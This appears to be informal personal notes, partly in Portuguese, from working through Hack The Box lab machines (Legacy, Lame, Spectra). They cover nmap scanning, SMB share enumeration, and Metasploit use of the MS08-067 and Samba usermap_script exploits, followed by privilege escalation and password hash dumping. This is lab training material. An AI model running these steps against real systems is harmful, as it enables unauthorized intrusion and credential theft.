https://www.hackthebox.eu/

https://help.hackthebox.eu/getting-started/v2-machines

Starting Point

Connect to the VPN via your console
$openvpn /path/to/rubens.ovpn

LEGACY:
nikto - não é web server
nmap -A -T4 -p- 10.10.10.4 ### scan TCP. For UDP: -sU

ACK
SYN ACK
ACK - or RST

Port 139 - 445 - SMB-os related - Windows definitive
message_signing: disabled (dangerous, but default) -> Vulnerability **

Try:
smbclient -L \\10.10.10.4
smbclient -L \\\\10.10.10.4\\$ADMIN 

search smb_version
use auxiliary/scanner/smb/smb_version   -> auxiliary look for, does not attack
set RHOSTS 10.10.10.4
set THREADS 10

Goo Windows XP SP3 exploit

https://www.exploit-db.com
https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/ -> Makes metasploit

msfconsole
set options
set payload
run

NT AUTHOrity -> highest
getuid
sysinfo
architecture must match meterpreter shell x86
meterpreter> help
POST -> arp

getsystem -> escalate privileges -> may crash machine
hashdump -> crack passwords -> second hash crackmapexec psexec

> shell
C:\WINDOWS\> cd Documents Settings \  john z Desktop\ type user.txt submit flag
C:\WINDOWS\> cd Documents Settings \ administrator \ Desktop\type root.txt submit flag
pwd
cd c:\\
dir

nmap -A -T4 -p- -Pn 10.10.10.229

SPECTRA

use unix/webapp/php_include

set payload payload/php/bind_php_ipv6

LAME

openvpn ./rubensz.ovpn

scanning:
nmap -A -T5 -p- -Pn 10.10.10.3
-A takes loger, OS, etc
nmap -A -T5 -p21,80 -Pn 10.10.10.3

ver antes as portas**
e depois versões**
distccd v1 ((GNU) 4.2.4
samba.py

Port 21 FTP - ** versions are exploitable - buffer overflow - upload + social engineering to open file
Port 22 SSH - hard - brute force
Port 443

red team quiet

Host script results:
|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)

smbclient \\\\10.10.10.3\\
smbclient \\\\10.10.10.3\\tmp

we can upload but how to execute ?

try:
smbclient \\\\10.10.10.3\\opt
smbclient \\\\10.10.10.3\\$ADMIN

Host script results:
|_clock-skew: mean: 2h08m30s, deviation: 2h49m45s, median: 8m28s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)

Goo

Samba 3.0.20 Debian exploit
exploit-db
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) 

systemctl postgresql enable
msfconsole

Rapid7:
msf > use exploit/multi/samba/usermap_script
msf exploit(usermap_script) > show targets
    ...targets...
msf exploit(usermap_script) > set TARGET < target-id >
msf exploit(usermap_script) > show options
msf exploit(usermap_script) > exploit

locate root.txt
locate user.txt

